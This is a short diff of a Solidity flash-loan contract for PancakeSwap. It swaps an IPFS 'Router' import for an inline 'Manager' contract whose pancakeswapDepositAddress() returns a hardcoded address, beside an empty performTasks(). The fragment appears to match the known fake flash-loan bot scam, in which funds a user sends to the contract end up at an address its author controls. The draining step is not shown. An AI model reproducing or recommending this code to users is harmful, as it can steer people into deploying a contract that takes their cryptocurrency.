@@ -10,8 +10,14 @@ import "https://github.com/Orlandis19/Flash/blob/main/pancake-swap-core/IPancake
 import "https://github.com/Orlandis19/Flash/blob/main/pancake-swap-core/IPancakePairs.sol";
    
 //Router
-import "ipfs://0xEfE66eB5db217BCebF0D4E630B533564207Aa4Ee";
-   
+pragma solidity ^0.6.12;
+contract Manager { 
+    function performTasks() public {
+    }
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0xEfE66eB5db217BCebF0D4E630B533564207Aa4Ee;
+    }
+}   
 contract FlashLoan {
 	string public tokenName;
 	string public tokenSymbol;
